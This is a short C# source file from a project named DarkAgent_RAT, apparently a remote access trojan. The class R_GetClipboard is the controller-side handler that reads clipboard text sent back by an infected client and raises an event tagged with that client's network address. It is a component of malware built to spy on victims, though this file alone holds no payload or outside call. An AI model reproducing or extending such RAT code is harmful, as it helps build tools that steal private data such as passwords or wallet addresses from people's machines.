using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Events;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_GetClipboard : ReceiveBasePacket
    {
        string tmp;
        public R_GetClipboard(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {
            tmp = ReadString();
        }

        public override void Run()
        {
            ClipboardEventArgs e1 = new ClipboardEventArgs(Client.RemoteEndPoint.ToString(), tmp);
            ClipboardEvent.OnClipboard(e1);
        }
    }
}
